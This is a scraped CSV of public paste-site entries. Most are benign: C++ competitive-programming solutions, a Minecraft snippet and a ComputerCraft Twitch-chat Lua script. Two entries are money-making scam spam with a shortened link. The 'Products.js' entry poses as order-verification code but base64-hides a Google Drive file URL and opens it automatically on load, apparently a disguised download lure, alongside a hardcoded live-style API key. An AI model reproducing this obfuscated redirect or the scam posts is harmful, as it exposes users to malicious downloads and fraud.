id,title,username,language,date,content
E69ffwxd,NOI18 Knapsack 100p,Hezov,C++,Friday 4th of April 2025 07:04:54 AM CDT,"// https://oj.uz/problem/view/NOI18_knapsack 100p
#include <iostream>
#include <algorithm>
#include <vector>
using namespace std;
struct item{int val, cnt;};
vector<item> A[2002];
int dp[2001][2001];
// dp[i][j] - considerand greutati pana la i care e
// valoarea maxima obtinuta cu capacitatea j.
bool cmp(item a, item b)
{
    return a.val > b.val;
}
int main()
{
    int S, N;
    cin >> S >> N;
    for(int i = 1;i<=N;i++)
    {
        int v, w, k;
        cin >> v >> w >>  k;
        A[w].push_back({v,k});
    }
    for(int i = 1;i<=S;i++)
        if(!A[i].empty())
            sort(A[i].begin(),A[i].end(),cmp);

    for(int i = 1;i<=S;i++) // consideram greutatea i
    {
        // Avem un rucsac cu capacitatea G
        for(int G = 1;G<=S;G++)
        {
            int sumV = 0, taken = 0 ;
            dp[i][G] = dp[i-1][G];
            for(int j = 0; j < A[i].size();j++)
            {
                // Ne aflam intr-un item si nu stim cate sa luam din el.
                if(taken + 1 > G / i) break;
                for(int it = 1; it <= A[i][j].cnt;it++)
                {
                    if(taken + 1 > G / i) break;
                    taken++;
                    sumV += A[i][j].val;
                    dp[i][G] = max(dp[i][G], dp[i - 1][G - taken * i] + sumV);
                }
            }
        }

    }
    cout << dp[S][S] << '\n';
}
"
tV4Qt6zF,EARN $900 INSTANTLY 2025 V9,bgftxc,JavaScript,Friday 4th of April 2025 07:03:14 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


604zbjHQqk
"
AVG1zkTA,NOI18 Knapsack 73p,Hezov,C++,Friday 4th of April 2025 07:02:53 AM CDT,"// https://oj.uz/problem/view/NOI18_knapsack 73 puncte 
#include <iostream>
using namespace std;
int dp[101][2001], v[2001], w[2001], k[2001];
int main()
{
    int S, N;
    cin >> S >> N;
    for(int i = 1;i<=N;i++)
        cin >> v[i] >> w[i] >> k[i];
    for(int i = 0;i<=N;i++)
    {
        for(int j = 0;j<=S;j++)
        {
            if(i == 0 || j == 0) dp[i][j] = 0;
            else
            {
                dp[i][j] = dp[i-1][j];
                for(int nr = 1; nr * w[i] <= j && nr <= k[i];nr++)
                {
                    dp[i][j] = max(dp[i][j], dp[i - 1][j - nr * w[i]] + v[i] * nr);
                }
            }
        }
    }
    cout << dp[N][S];
    return 0;
}
"
34FxQMK3,颜色平衡树 参考代码,Dmaxiya,C++,Friday 4th of April 2025 06:57:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 200000 + 100;
int n, f, ans;
int c[maxn], id[maxn], son[maxn], mxCnt[maxn];
vector<int> G[maxn];
map<int, int> cnt[maxn];
map<int, int>::iterator it;

int merge(int id1, int id2) {
    if (cnt[id1].size() > cnt[id2].size()) {
        swap(id1, id2);
    }
    for (it = cnt[id1].begin(); it != cnt[id1].end(); ++it) {
        cnt[id2][it->first] += it->second;
        mxCnt[id2] = max(mxCnt[id2], cnt[id2][it->first]);
    }
    return id2;
}

void dfs(int root) {
    int &idd = id[root];
    cnt[idd][c[root]] = 1;
    for (int pos : G[root]) {
        dfs(pos);
        idd = merge(idd, id[pos]);
        son[root] += son[pos];
    }
    if ((LL) mxCnt[idd] * cnt[idd].size() == son[root]) {
        ++ans;
    }
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    for (int i = 1; i <= n; ++i) {
        cin >> c[i] >> f;
        G[f].push_back(i);
        id[i] = i;
        mxCnt[i] = 1;
        son[i] = 1;
    }
    dfs(1);
    cout << ans << endl;

    return 0;
}
"
ibz2VgbL,use minecraft stuff,brucelee,C#,Friday 4th of April 2025 06:55:19 AM CDT," {""productivebees:gene_group"":{purity:100}}"
i2DVnWYK,Make $1000 15-MINUTES (BEGINNER) RV,bgftxc,JavaScript,Friday 4th of April 2025 06:47:18 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


veyZKIbdcP
"
Nf0K8egC,Twitch_Chat_steeltv,ZeProf2ModsYTB,Lua,Friday 4th of April 2025 06:44:55 AM CDT,"CHATROOM = ""levraisteeltv""
SUBSONLY = false
CLEAR_MESSAGES = true

local expect = require ""cc.expect""
local expect, field = expect.expect, expect.field

local type, getmetatable, setmetatable, colours, str_write, tostring = type, getmetatable, setmetatable, colours, write, tostring
local debug_info = type(debug) == ""table"" and type(debug.getinfo) == ""function"" and debug.getinfo
local debug_local = type(debug) == ""table"" and type(debug.getlocal) == ""function"" and debug.getlocal

--- @{table.insert} alternative, but with the length stored inline.
local function append(out, value)
    local n = out.n + 1
    out[n], out.n = value, n
end

--- A document containing formatted text, with multiple possible layouts.
--
-- Documents effectively represent a sequence of strings in alternative layouts,
-- which we will try to print in the most compact form necessary.
--
-- @type Doc
local Doc = { }

--- An empty document.
local empty = setmetatable({ tag = ""nil"" }, Doc)

--- A document with a single space in it.
local space = setmetatable({ tag = ""text"", text = "" "" }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{empty}.
local line = setmetatable({ tag = ""line"", flat = empty }, Doc)

--- A line break. When collapsed with @{group}, this will be replaced with @{space}.
local space_line = setmetatable({ tag = ""line"", flat = space }, Doc)

local text_cache = { [""""] = empty, ["" ""] = space, [""\n""] = space_line }

local function mk_text(text, colour)
    return text_cache[text] or setmetatable({ tag = ""text"", text = text, colour = colour }, Doc)
end

--- Create a new document from a string.
--
-- If your string contains multiple lines, @{group} will flatten the string
-- into a single line, with spaces between each line.
--
-- @tparam      string text   The string to construct a new document with.
-- @tparam[opt] number colour The colour this text should be printed with. If not given, we default to the current
-- colour.
-- @treturn Doc The document with the provided text.
-- @usage Write some blue text.
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.text(""Hello!"", colours.blue))
local function text(text, colour)
    expect(1, text, ""string"")
    expect(2, colour, ""number"", ""nil"")

    local cached = text_cache[text]
    if cached then return cached end

    local new_line = text:find(""\n"", 1)
    if not new_line then return mk_text(text, colour) end

    -- Split the string by ""\n"". With a micro-optimisation to skip empty strings.
    local doc = setmetatable({ tag = ""concat"", n = 0 }, Doc)
    if new_line ~= 1 then append(doc, mk_text(text:sub(1, new_line - 1), colour)) end

    new_line = new_line + 1
    while true do
        local next_line = text:find(""\n"", new_line)
        append(doc, space_line)
        if not next_line then
            if new_line <= #text then append(doc, mk_text(text:sub(new_line), colour)) end
            return doc
        else
            if new_line <= next_line - 1 then
                append(doc, mk_text(text:sub(new_line, next_line - 1), colour))
            end
            new_line = next_line + 1
        end
    end
end

--- Concatenate several documents together. This behaves very similar to string concatenation.
--
-- @tparam Doc|string ... The documents to concatenate.
-- @treturn Doc The concatenated documents.
-- @usage
--     local pretty = require ""cc.pretty""
--     local doc1, doc2 = pretty.text(""doc1""), pretty.text(""doc2"")
--     print(pretty.concat(doc1, "" - "", doc2))
--     print(doc1 .. "" - "" .. doc2) -- Also supports ..
local function concat(...)
    local args = table.pack(...)
    for i = 1, args.n do
        if type(args[i]) == ""string"" then args[i] = text(args[i]) end
        if getmetatable(args[i]) ~= Doc then expect(i, args[i], ""document"") end
    end

    if args.n == 0 then return empty end
    if args.n == 1 then return args[1] end

    args.tag = ""concat""
    return setmetatable(args, Doc)
end

Doc.__concat = concat --- @local

--- Indent later lines of the given document with the given number of spaces.
--
-- For instance, nesting the document
-- ```txt
-- foo
-- bar
-- ```
-- by two spaces will produce
-- ```txt
-- foo
--   bar
-- ```
--
-- @tparam number depth The number of spaces with which the document should be indented.
-- @tparam Doc    doc   The document to indent.
-- @treturn Doc The nested document.
-- @usage
--     local pretty = require ""cc.pretty""
--     print(pretty.nest(2, pretty.text(""foo\nbar"")))
local function nest(depth, doc)
    expect(1, depth, ""number"")
    if getmetatable(doc) ~= Doc then expect(2, doc, ""document"") end
    if depth <= 0 then error(""depth must be a positive number"", 2) end

    return setmetatable({ tag = ""nest"", depth = depth, doc }, Doc)
end

local function flatten(doc)
    if doc.flat then return doc.flat end

    local kind = doc.tag
    if kind == ""nil"" or kind == ""text"" then
        return doc
    elseif kind == ""concat"" then
        local out = setmetatable({ tag = ""concat"", n = doc.n }, Doc)
        for i = 1, doc.n do out[i] = flatten(doc[i]) end
        doc.flat, out.flat = out, out -- cache the flattened node
        return out
    elseif kind == ""nest"" then
        return flatten(doc[1])
    elseif kind == ""group"" then
        return doc[1]
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Builds a document which is displayed on a single line if there is enough
-- room, or as normal if not.
--
-- @tparam Doc doc The document to group.
-- @treturn Doc The grouped document.
-- @usage Uses group to show things being displayed on one or multiple lines.
--
--     local pretty = require ""cc.pretty""
--     local doc = pretty.group(""Hello"" .. pretty.space_line .. ""World"")
--     print(pretty.render(doc, 5)) -- On multiple lines
--     print(pretty.render(doc, 20)) -- Collapsed onto one.
local function group(doc)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end

    if doc.tag == ""group"" then return doc end -- Skip if already grouped.

    local flattened = flatten(doc)
    if flattened == doc then return doc end -- Also skip if flattening does nothing.
    return setmetatable({ tag = ""group"", flattened, doc }, Doc)
end

local function get_remaining(doc, width)
    local kind = doc.tag
    if kind == ""nil"" or kind == ""line"" then
        return width
    elseif kind == ""text"" then
        return width - #doc.text
    elseif kind == ""concat"" then
        for i = 1, doc.n do
            width = get_remaining(doc[i], width)
            if width < 0 then break end
        end
        return width
    elseif kind == ""group"" or kind == ""nest"" then
        return get_remaining(kind[1])
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Display a document on the terminal.
--
-- @tparam      Doc     doc         The document to render
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function write(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")

    local term = term
    local width, height = term.getSize()
    local ribbon_width = (ribbon_frac or 0.6) * width
    if ribbon_width < 0 then ribbon_width = 0 end
    if ribbon_width > width then ribbon_width = width end

    local def_colour = term.getTextColour()
    local current_colour = def_colour

    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            local doc_colour = doc.colour or def_colour
            if doc_colour ~= current_colour then
                term.setTextColour(doc_colour)
                current_colour = doc_colour
            end

            str_write(doc.text)

            return col + #doc.text
        elseif kind == ""line"" then
            local _, y = term.getCursorPos()
            if y < height then
                term.setCursorPos(indent + 1, y + 1)
            else
                term.scroll(1)
                term.setCursorPos(indent + 1, height)
            end

            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    local col = math.max(term.getCursorPos() - 1, 0)
    go(doc, 0, col)
    if current_colour ~= def_colour then term.setTextColour(def_colour) end
end

--- Display a document on the terminal with a trailing new line.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function print(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")
    write(doc, ribbon_frac)
    str_write(""\n"")
end

--- Render a document, converting it into a string.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  width       The maximum width of this document. Note that long strings will not be wrapped to
-- fit this width - it is only used for finding the best layout.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
-- @treturn string The rendered document as a string.
local function render(doc, width, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, width, ""number"", ""nil"")
    expect(3, ribbon_frac, ""number"", ""nil"")

    local ribbon_width
    if width then
        ribbon_width = (ribbon_frac or 0.6) * width
        if ribbon_width < 0 then ribbon_width = 0 end
        if ribbon_width > width then ribbon_width = width end
    end

    local out = { n = 0 }
    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            append(out, doc.text)
            return col + #doc.text
        elseif kind == ""line"" then
            append(out, ""\n"" .. ("" ""):rep(indent))
            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if not width or get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    go(doc, 0, 0)
    return table.concat(out, """", 1, out.n)
end

Doc.__tostring = render --- @local

local keywords = {
    [""and""] = true, [""break""] = true, [""do""] = true, [""else""] = true,
    [""elseif""] = true, [""end""] = true, [""false""] = true, [""for""] = true,
    [""function""] = true, [""if""] = true, [""in""] = true, [""local""] = true,
    [""nil""] = true, [""not""] = true, [""or""] = true, [""repeat""] = true, [""return""] = true,
    [""then""] = true, [""true""] = true, [""until""] = true, [""while""] = true,
  }

local comma = text("","")
local braces = text(""{}"")
local obrace, cbrace = text(""{""), text(""}"")
local obracket, cbracket = text(""[""), text(""] = "")

local function key_compare(a, b)
    local ta, tb = type(a), type(b)

    if ta == ""string"" then return tb ~= ""string"" or a < b
    elseif tb == ""string"" then return false
    end

    if ta == ""number"" then return tb ~= ""number"" or a < b end
    return false
end

local function show_function(fn, options)
    local info = debug_info and debug_info(fn, ""Su"")

    -- Include function source position if available
    local name
    if options.function_source and info and info.short_src and info.linedefined and info.linedefined >= 1 then
        name = ""function<"" .. info.short_src .. "":"" .. info.linedefined .. "">""
    else
        name = tostring(fn)
    end

    -- Include arguments if a Lua function and if available. Lua will report ""C""
    -- functions as variadic.
    if options.function_args and info and info.what == ""Lua"" and info.nparams and debug_local then
        local args = {}
        for i = 1, info.nparams do args[i] = debug_local(fn, i) or ""?"" end
        if info.isvararg then args[#args + 1] = ""..."" end
        name = name .. ""("" .. table.concat(args, "", "") .. "")""
    end

    return name
end

local function pretty_impl(obj, options, tracking)
    local obj_type = type(obj)
    if obj_type == ""string"" then
        local formatted = (""%q""):format(obj):gsub(""\\\n"", ""\\n"")
        return text(formatted, colours.red)
    elseif obj_type == ""number"" then
        return text(tostring(obj), colours.magenta)
    elseif obj_type == ""function"" then
        return text(show_function(obj, options), colours.lightGrey)
    elseif obj_type ~= ""table"" or tracking[obj] then
        return text(tostring(obj), colours.lightGrey)
    elseif getmetatable(obj) ~= nil and getmetatable(obj).__tostring then
        return text(tostring(obj))
    elseif next(obj) == nil then
        return braces
    else
        tracking[obj] = true
        local doc = setmetatable({ tag = ""concat"", n = 1, space_line }, Doc)

        local length, keys, keysn = #obj, {}, 1
        for k in pairs(obj) do keys[keysn], keysn = k, keysn + 1 end
        table.sort(keys, key_compare)

        for i = 1, keysn - 1 do
            if i > 1 then append(doc, comma) append(doc, space_line) end

            local k = keys[i]
            local v = obj[k]
            local ty = type(k)
            if ty == ""number"" and k % 1 == 0 and k >= 1 and k <= length then
                append(doc, pretty_impl(v, options, tracking))
            elseif ty == ""string"" and not keywords[k] and k:match(""^[%a_][%a%d_]*$"") then
                append(doc, text(k .. "" = ""))
                append(doc, pretty_impl(v, options, tracking))
            else
                append(doc, obracket)
                append(doc, pretty_impl(k, options, tracking))
                append(doc, cbracket)
                append(doc, pretty_impl(v, options, tracking))
            end
        end

        tracking[obj] = nil
        return group(concat(obrace, nest(2, concat(table.unpack(doc, 1, doc.n))), space_line, cbrace))
    end
end

--- Pretty-print an arbitrary object, converting it into a document.
--
-- This can then be rendered with @{write} or @{print}.
--
-- @param obj The object to pretty-print.
-- @tparam[opt] { function_args = boolean, function_source = boolean } options
-- Controls how various properties are displayed.
--  - `function_args`: Show the arguments to a function if known (`false` by default).
--  - `function_source`: Show where the function was defined, instead of
--    `function: xxxxxxxx` (`false` by default).
-- @treturn Doc The object formatted as a document.
-- @usage Display a table on the screen
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.pretty({ 1, 2, 3 }))
local function prettyf(obj, options)
    expect(2, options, ""table"", ""nil"")
    options = options or {}

    local actual_options = {
        function_source = field(options, ""function_source"", ""boolean"", ""nil"") or false,
        function_args = field(options, ""function_args"", ""boolean"", ""nil"") or false,
    }
    return pretty_impl(obj, actual_options, {})
end

local pretty = {
    empty = empty,
    space = space,
    line = line,
    space_line = space_line,
    text = text,
    concat = concat,
    nest = nest,
    group = group,

    write = write,
    print = print,
    render = render,

    pretty = prettyf,
}

local monitor = peripheral.find(""monitor"")
local oldTerm = term.redirect(monitor)

function split(str, character)
  result = {}
  index = 1
  for s in string.gmatch(str, ""[^""..character..""]+"") do
    result[index] = s
    index = index + 1
  end
  return result
end
local hex = {""F0F0F0"", ""F2B233"", ""E57FD8"", ""99B2F2"", ""DEDE6C"", ""7FCC19"", ""F2B2CC"", ""4C4C4C"", ""999999"", ""4C99B2"", ""B266E5"", ""3366CC"", ""7F664C"", ""57A64E"", ""CC4C4C"", ""191919""}
local rgb = {}
for i=1,16,1 do
  rgb[i] = {tonumber(hex[i]:sub(1, 2), 16), tonumber(hex[i]:sub(3, 4), 16), tonumber(hex[i]:sub(5, 6), 16)}
end
local rgb2 = {}
for i=1,16,1 do
  rgb2[i] = {}
  for j=1,16,1 do
    rgb2[i][j] = {(rgb[i][1] * 34 + rgb[j][1] * 20) / 54, (rgb[i][2] * 34 + rgb[j][2] * 20) / 54, (rgb[i][3] * 34 + rgb[j][3] * 20) / 54}
  end
end
 
colors.fromRGB = function (r, g, b)
  local dist = 1e100
  local d = 1e100
  local color = -1
  for i=1,16,1 do
    d = math.sqrt((math.max(rgb[i][1], r) - math.min(rgb[i][1], r)) ^ 2 + (math.max(rgb[i][2], g) - math.min(rgb[i][2], g)) ^ 2 + (math.max(rgb[i][3], b) - math.min(rgb[i][3], b)) ^ 2)
    if d < dist then
      dist = d
      color = i - 1
    end
  end
  return 2 ^ color
end
 
local ws

function main()
	ws, err = http.websocket(""wss://irc-ws.chat.twitch.tv"")
	if err then
		print(err)
	elseif ws then
		ws.send(""PASS ottomated"")
		ws.send(""NICK justinfan""..math.random(10000, 99999))
		ws.send(""JOIN #""..CHATROOM)
		ws.send(""CAP REQ :twitch.tv/tags"")
		ws.send(""CAP REQ :twitch.tv/commands"")
		while true do
			local msg = ws.receive()
			if msg == ""PING :tmi.twitch.tv"" then
				ws.send(""PONG :tmi.twitch.tv"")
			else
				-- print(msg)
				local parts = split(msg, "" "")
				if parts[3] == ""PRIVMSG"" then
					local twitchParts = split(parts[1], "";"")
					local nameColor = ""#ffffff""
					local displayName
					local subscriber = false
					local founder = false
					local id
					for _, part in ipairs(twitchParts) do
						if string.sub(part, 1, 12) == ""@badge-info="" then
							founder = string.find(part, ""founder"") ~= nil
						elseif string.sub(part, 1, 6) == ""color="" then
							nameColor = string.sub(part, 7, -1)
						elseif string.sub(part, 1, 13) == ""display-name="" then
							displayName = string.sub(part, 14, -1)
						elseif string.sub(part, 1, 3) == ""id="" then
							id = string.sub(part, 4, -1)
						elseif string.sub(part, 1, 11) == ""subscriber="" then
							subscriber = string.sub(part, 12, -1) == ""1""
						end
					end
					subscriber = subscriber or founder
					
					local namePalette
					if #nameColor < 1 then
						namePalette = 2^math.random(0, 15)
					else
						local hex = string.sub(nameColor, 2, -1)
						local r = tonumber(string.sub(hex, 1, 2), 16)
						local g = tonumber(string.sub(hex, 3, 4), 16)
						local b = tonumber(string.sub(hex, 5, 6), 16)
						namePalette = colors.fromRGB(r, g, b)
					end

					if namePalette == colors.black or namePalette == colors.white then
						namePalette = colors.lightGray
					end

					if displayName and id then
						local message = string.sub(parts[5], 2, -1)

						for i=6,#parts do
							message = message.."" ""..parts[i]
						end
						if string.sub(message, 1, 7) == ""ACTION"" then
							message = string.sub(message, 9, -4)
						else
							message = string.sub(message, 1, -2)
						end
						if subscriber or not SUBSONLY then
							pretty.print(pretty.group(pretty.text(displayName, namePalette) .. pretty.text("":"", colors.white) .. pretty.space .. pretty.text(message, colors.white)))
							-- term.setTextColor(namePalette)
							-- term.write(displayName)
							-- term.setCursorPos()
							-- print(displayName, message)
						end
					end
				elseif CLEAR_MESSAGES and (parts[3] == ""CLEARMSG"" or parts[3] == ""CLEARCHAT"") then
					term.clear()
					term.setCursorPos(1,1)
				end
			end
		end
	end
end
while true do
 pcall(main)
 if ws then
	 ws.close()
 end
end
--term.redirect(oldTerm)"
LgWyzmNx,Untitled,mrf16093,HTML,Friday 4th of April 2025 06:42:04 AM CDT,This paste is hidden.
mXyZMdNi,Products.js,iLoveToWatch,JavaScript,Friday 4th of April 2025 06:36:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/519/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TR116Rgt,更小的数 参考代码,Dmaxiya,C++,Friday 4th of April 2025 06:34:54 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 5000 + 100;
int n, ans;
char str[maxn];
int dp[maxn][maxn];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> (str + 1);
    n = strlen(str + 1);
    for (int len = 1; len <= n; ++len) {
        for (int l = 1; l + len - 1 <= n; ++l) {
            int r = l + len - 1;
            if (str[r] < str[l]) {
                dp[l][r] = 1;
            } else if (str[r] > str[l]) {
                dp[l][r] = -1;
            } else {
                dp[l][r] = dp[l + 1][r - 1];
            }
            if (dp[l][r] == 1) {
                ++ans;
            }
        }
    }
    cout << ans << endl;

    return 0;
}
"
